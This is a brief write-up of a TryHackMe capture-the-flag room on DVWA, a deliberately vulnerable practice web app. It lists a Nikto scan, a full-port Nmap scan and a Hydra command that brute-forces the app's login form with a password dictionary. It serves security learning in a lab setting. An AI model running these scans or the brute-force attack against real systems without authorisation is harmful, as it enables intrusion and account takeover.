# 🧪 TryHackMe Room: DVWA

**Date Completed:** April 2025  
**Platform:** [TryHackMe](https://tryhackme.com)  
**Room Link:** https://tryhackme.com/room/dvwa  

### 🎯 Objective:
Gain access to the target system.

### 🛠️ Tools Used:
- Nmap
- Nikto
- Hydra

### 🔍 Vulnerabilty Scanning using Nikto:
nikto -h 'ip_address' -o nikto_result.html -Format htm

### 🔍 Network Security Scan using Nmap:
nmap -p 1-65535 'ip_address'

### 🔍 Exploitation Bruteforce using Hydra:
hydra -l admin -P [path_to_password_dictionary] 'http-get-form://ip_address/:username=^USER^&password=^PASS^&Login=submit:H=cookies_content:Username and/or Password incorrect'

### 🧠 Lessons Learned:
Learned about brute forcing using Hydra, scanning vulnerability using Nikto, and finding the open port using Nmap.
